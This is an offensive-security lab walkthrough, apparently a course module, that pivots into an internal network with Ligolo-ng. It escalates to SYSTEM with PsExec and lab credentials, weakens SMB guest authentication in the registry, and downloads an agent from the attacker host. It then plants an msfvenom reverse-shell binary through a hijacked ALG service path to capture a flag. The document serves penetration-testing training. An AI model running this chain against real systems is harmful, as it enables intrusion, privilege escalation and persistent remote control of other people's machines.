Ligolo-NG: Mastering Advanced Network Pivoting

Persistence & Privilege Escalation | Module 2

1. Initial Access & Preparation

Network Configuration:

  • Attacker (Kali): 10.10.14.221
  • Victim 1 (SRV01): 10.10.111.111
  • Victim 2 (SRV02 - Internal): 172.20.0.52
  • Internal Network: 172.20.0.0/24

Credential Discovery:

Before proceeding with the attack, students have obtained valid RDP credentials for the Windows machine (SRV01):
Username: helen
Password: RedRiot88

Connecting to the Target

First, establish a remote desktop connection to SRV01 using the discovered credentials. We use xfreerdp with the following flags:
/v specifies the target server, /u and /p are the username and password, and /dynamic-resolution adjusts the RDP window to your screen size.

xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution

Students will reuse the previously spawned target and RDP session(s). To begin, exit any existing sessions and establish a new PsExec session with SYSTEM privileges.

Elevating Access to SYSTEM

We use PsExec to execute processes on the remote machine. The -i flag runs the program interactively, -s runs it as the SYSTEM account (highest privilege), and -u/-p provides valid credentials to authenticate.

cd C:\Tools\SysInternalsSuite
.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd
PsExec v2.43 - Execute processes remotely

Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

Registry Modification

Within the PsExec session on SRV02, we modify the registry to allow guest access in SMB2 and SMB3. This command sets AllowInsecureGuestAuth to 1 (enabled), which is often required to access shared folders without strict authentication headers during pivoting.

reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
The operation completed successfully.

Discover Target IP

Subsequently, open PowerShell and ping SRV02 to uncover the IP address assigned to that machine. This confirms DNS resolution and connectivity to the internal target.

ping SRV02

Reply from 172.20.0.52: bytes=32 time=1ms TTL=128

2. Network Pivoting with Ligolo-ng

Students will discover that SRV02 is part of an internal network, requiring dynamic port-forwarding using ligolo-ng.

Setting up Ligolo-ng

Download the respective versions for Linux (proxy) and Windows (agent) from the GitHub releases using wget.

wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz

Extract the archives using unzip for the Windows zip file and tar for the Linux gzip file. We then make the proxy executable with chmod +x.

unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

Transfer & Execution

Start a Python HTTP server on port 8000. This allows the victim machine to download files from our attacker machine.

python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Download the executable on the target machine (SRV02) via PowerShell using `iwr` (Invoke-WebRequest). We target our attacker IP on port 8000.

iwr -uri http://10.10.14.221:8000/agent.exe -o agent.exe

Start Ligolo's proxy on the attacker machine using -selfcert to automatically generate self-signed TLS certificates for the connection.

./proxy -selfcert
INFO[0000] Listening on 0.0.0.0:11601

Establish the connection from the target machine back to our proxy. We use -ignore-cert because we are using self-signed certificates.

.\agent.exe -connect 10.10.14.221:11601 -ignore-cert
time="2024-07-11T03:49:21-05:00" level=info msg="Connection established"

Interface Configuration

Configure the network interface on the attacker machine. This creates a virtual TUN interface named ligolo and adds a route to the internal 172.20.0.0/24 network through that interface.

whoami
student
sudo ip tuntap add user student mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.20.0.0/24 dev ligolo

Finally, select the session in the Ligolo proxy console and type start to activate the tunnel.

session
start
INFO[6744] Starting tunnel to INLANEFREIGHT\helen@SRV0

3. Service Abuse & Flag Capture

With the network tunnel established, we will now exploit the Application Layer Gateway Service (ALG) to gain persistent access.

Payload Generation

Generate a Windows reverse shell using msfvenom. We use -p for payload selection, LHOST/LPORT for our listener details, and -f exe-service to create an executable compatible with Windows Services.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.221 LPORT=9001 -f exe-service -o service-shell.exe
Saved as: service-shell.exe

Hosting the Payload (SMB)

Initiate an SMB server using Impacket. This creates a share named share in the current directory, allowing the target machine to download service-shell.exe via the network path \\10.10.14.221\share.

sudo impacket-smbserver share ./ -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed...

Configuring ALG Service

We use impacket-services to remotely modify the ALG service configuration. Specifically, we change the binPath to point to our malicious executable hosted on the SMB share. When the service starts, it will execute our shell instead of the legitimate binary.

impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name ALG -path "\\\\10.10.14.221\\share\\service-shell.exe"
[*] Changing service config for ALG

Execution & Flag

Start a listener on port 9001 using Netcat (`nc`) to catch the incoming reverse shell connection.

nc -nvlp 9001
listening on [any] 9001 ...

Trigger the execution by starting the ALG service via Impacket. This forces the target to run our malicious binary.

impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name ALG

Return to your Netcat listener. You should see a connection. Use the type command to read the content of the flag file.

type C:\Flags\serviceflag.txt
rednexus{FLAG_CONTENT_HERE}
